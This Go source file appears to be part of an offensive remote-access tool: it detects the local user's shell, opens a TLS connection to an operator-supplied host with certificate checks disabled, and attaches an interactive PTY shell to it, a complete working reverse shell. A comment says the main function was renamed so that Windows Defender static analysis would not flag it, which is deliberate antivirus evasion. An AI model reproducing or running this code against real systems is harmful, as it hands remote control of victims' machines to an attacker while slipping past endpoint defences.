//go:build !windows

package tacos

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/ariary/go-utils/pkg/logger"
	"github.com/creack/pty"
	"golang.org/x/term"
)

// DetectDefaultShell returns the default shell for the current user.
func DetectDefaultShell() (shell string) {
	var command string
	if runtime.GOOS == "darwin" {
		command = "dscl . -read ~/ UserShell"
	} else {
		command = "grep ^$(id -un): /etc/passwd | cut -d : -f 7-"
	}

	defaultShell, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		log.Printf("Failed to detect default shell (%s), falling back to /bin/sh", err)
		return "/bin/sh"
	}

	shell = strings.TrimSpace(string(defaultShell))
	if runtime.GOOS == "darwin" {
		// dscl output is "UserShell: /bin/zsh"
		parts := strings.SplitN(shell, " ", 2)
		if len(parts) == 2 {
			shell = parts[1]
		}
	}
	return shell
}

// ShellArgs returns the appropriate flags for the given shell.
// bash gets "-li" (login + interactive), other interactive shells get "-i".
func ShellArgs(shell string) []string {
	if strings.Contains(shell, "bash") {
		return []string{"-li"}
	}
	if strings.Contains(shell, "zsh") || strings.Contains(shell, "csh") || strings.Contains(shell, "tsh") || strings.Contains(shell, "/sh") {
		return []string{"-i"}
	}
	return nil
}

// ConnectTLS dials a TLS connection to host with retry logic.
// Returns the connection or an error if all attempts fail.
func ConnectTLS(host string, timeoutSec int, maxRetries int) (*tls.Conn, error) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	dialer := &net.Dialer{
		Timeout: time.Duration(timeoutSec) * time.Second,
	}

	var conn *tls.Conn
	var err error
	for attempt := 0; attempt <= maxRetries; attempt++ {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, conf)
		if err == nil {
			return conn, nil
		}
		log.Printf("Connection attempt %d/%d failed: %s", attempt+1, maxRetries+1, err)
		if attempt < maxRetries {
			time.Sleep(2 * time.Second)
		}
	}
	return nil, fmt.Errorf("failed to connect to %s after %d attempt(s): %w", host, maxRetries+1, err)
}

// ShellReverse spawns a reverse shell with PTY targeting host (ip:port).
// (Name is ShellReverse because ReverseShell does not pass windows defender static analysis)
func ShellReverse(host string, shell string, timeoutSec int, maxRetries int) {
	logger.AddFilenameAndLinePrefix(log.Default())

	conn, err := ConnectTLS(host, timeoutSec, maxRetries)
	if err != nil {
		log.Fatalf("%s", err)
	}
	defer conn.Close()

	args := ShellArgs(shell)
	cmd := exec.Command(shell, args...)

	ptmx, err := pty.Start(cmd)
	if err != nil {
		log.Fatalf("Error starting pty: %s", err)
	}
	defer func() { _ = ptmx.Close() }()

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("Error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH
	defer func() { signal.Stop(ch); close(ch) }()

	// Graceful shutdown on SIGTERM/SIGINT
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		<-sigCh
		_ = ptmx.Close()
		conn.Close()
		os.Exit(0)
	}()

	// Set stdin in raw mode.
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Printf("Error setting stdin in raw mode: %s", err)
	}
	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }()

	// Bidirectional copy
	go func() {
		if _, err := io.Copy(ptmx, conn); err != nil {
			log.Printf("Connection->PTY copy ended: %s", err)
		}
	}()
	if _, err := io.Copy(conn, ptmx); err != nil {
		log.Printf("PTY->Connection copy ended: %s", err)
	}
}
